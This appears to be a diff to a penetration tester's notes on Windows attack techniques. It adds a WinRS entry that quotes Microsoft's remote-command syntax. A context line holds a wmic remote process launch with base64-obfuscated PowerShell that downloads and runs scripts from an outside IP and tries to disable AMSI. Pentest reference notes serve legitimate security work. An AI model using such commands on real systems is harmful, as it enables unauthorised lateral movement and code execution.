@@ -143,6 +143,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-chisel-fast-tcp-tunnel-over-http-secured-by-ssh">Chisel (Fast TCP Tunnel over HTTP secured by SSH)</a>
       * <a href="#-crackmapexec-1">CrackMapExec</a>
       * <a href="#-wmic-spawn-process">WMIC Spawn Process</a>
+      * <a href="#-winrs">WinRS</a>
       * <a href="#-invoke-wmiexecps1">Invoke-WMIExec.ps1</a>
       * <a href="#-powershell-invoke-command-requires-port-5985">Powershell Invoke-Command (Requires Port 5985)</a>
       * <a href="#-psexec">PSExec</a>
@@ -2242,6 +2243,22 @@ Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt 
 
 ```powershell
 wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create "powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA=="
+```
+
+
+
+#### [](#header-4) WinRS
+
+```powershell
+#https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs
+
+winrs [/<parameter>[:<value>]] <command>  
+
+winrs /r:https://contoso.com command
+
+winrs /r:http://[1080:0:0:0:8:800:200C:417A]:80 command  
+
+winrs /r:myserver /ad /u:administrator /p:$%fgh7 dir \\anotherserver\share
 ```
 
 
